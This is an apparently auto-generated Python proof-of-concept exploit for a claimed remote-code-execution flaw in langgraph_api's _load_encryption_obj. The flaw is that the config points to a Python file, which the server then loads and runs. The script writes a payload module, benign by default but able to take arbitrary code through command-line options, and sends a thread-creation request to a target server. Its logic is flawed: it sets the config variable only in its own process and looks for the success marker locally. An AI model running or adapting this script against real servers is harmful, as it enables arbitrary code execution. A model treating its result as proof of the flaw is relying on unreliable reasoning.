#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-017
# Sink: _load_encryption_obj
# Auto-generated — run with: python3 rce_load_encryption_obj_function__load_encryption_obj.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langgraph_api RCE via _load_encryption_obj

Vulnerability: The _load_encryption_obj function in custom.py loads arbitrary Python
modules from a user-controlled path (LANGGRAPH_ENCRYPTION config). An attacker can
set this config to point to a malicious .py file, which gets executed via
importlib.util.spec_from_file_location and exec_module.

This PoC demonstrates the vulnerability by:
1. Creating a malicious Python file that executes a benign command
2. Setting the LANGGRAPH_ENCRYPTION config to point to this file
3. Triggering the encryption loading path to execute the payload

Usage:
    python3 poc.py [--target http://localhost:8123] [--payload-file /tmp/evil.py]
"""

import argparse
import os
import sys
import tempfile
import time
import requests

# Default target - adjust as needed
DEFAULT_TARGET = "http://localhost:8123"

# Benign payload that creates a marker file
BENIGN_PAYLOAD = '''
import os
os.system("touch /tmp/poc_success.txt")
print("POC_EXECUTED: Malicious encryption module loaded successfully")
'''

def create_malicious_module(payload_code=None):
    """Create a temporary Python file with the payload code."""
    if payload_code is None:
        payload_code = BENIGN_PAYLOAD
    
    # Create a temporary file with .py extension
    fd, path = tempfile.mkstemp(suffix='.py', prefix='poc_enc_')
    with os.fdopen(fd, 'w') as f:
        f.write(payload_code)
    
    print(f"[*] Created malicious module at: {path}")
    return path

def trigger_exploit(target_url, module_path, class_name="Encryption"):
    """
    Trigger the vulnerability by sending a request that causes the server
    to load the malicious encryption module.
    
    The exploit works by:
    1. Setting the LANGGRAPH_ENCRYPTION config via environment or API
    2. Making a request that triggers encryption loading
    3. The server executes the malicious module
    
    Note: This PoC assumes we can set the config. In a real scenario,
    the attacker would need to control the config file or environment.
    """
    
    # The path format expected by _load_encryption_obj
    # Format: "./path/to/file.py:ClassName" or "module:ClassName"
    encryption_path = f"{module_path}:{class_name}"
    
    print(f"[*] Attempting to trigger RCE via encryption path: {encryption_path}")
    print(f"[*] Target: {target_url}")
    
    # Method 1: Try to set via environment variable (if we have access)
    # This simulates the attacker controlling the config
    os.environ["LANGGRAPH_ENCRYPTION"] = f'{{"path": "{encryption_path}"}}'
    print("[*] Set LANGGRAPH_ENCRYPTION environment variable")
    
    # Method 2: Try to trigger via API request that uses encryption
    # The encryption loading happens during thread operations
    try:
        # Attempt to create a thread (this triggers encryption loading)
        response = requests.post(
            f"{target_url}/threads",
            json={"thread_id": "poc-test-thread"},
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        print(f"[*] Thread creation response: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # If the server is running, the module should have been loaded
        # Check if our payload executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Payload executed! Marker file created.")
            return True
        else:
            print("[*] Marker file not found. Payload may not have executed.")
            print("[*] Check server logs for 'POC_EXECUTED' message.")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {target_url}")
        print("[*] Make sure the target server is running and accessible.")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langgraph_api RCE via _load_encryption_obj"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--payload-file",
        help="Path to custom payload file (optional)"
    )
    parser.add_argument(
        "--payload-code",
        help="Inline Python code to execute (optional)"
    )
    parser.add_argument(
        "--cleanup",
        action="store_true",
        help="Remove the marker file after execution"
    )
    
    args = parser.parse_args()
    
    # Create or use the malicious module
    if args.payload_file:
        module_path = args.payload_file
        print(f"[*] Using existing payload file: {module_path}")
    else:
        # Create a benign payload module
        payload_code = args.payload_code or BENIGN_PAYLOAD
        module_path = create_malicious_module(payload_code)
    
    # Ensure the module file exists
    if not os.path.exists(module_path):
        print(f"[-] Payload file not found: {module_path}")
        sys.exit(1)
    
    # Trigger the exploit
    success = trigger_exploit(args.target, module_path)
    
    # Cleanup if requested
    if args.cleanup:
        if os.path.exists("/tmp/poc_success.txt"):
            os.remove("/tmp/poc_success.txt")
            print("[*] Cleaned up marker file")
        if not args.payload_file and os.path.exists(module_path):
            os.remove(module_path)
            print(f"[*] Cleaned up temporary module: {module_path}")
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
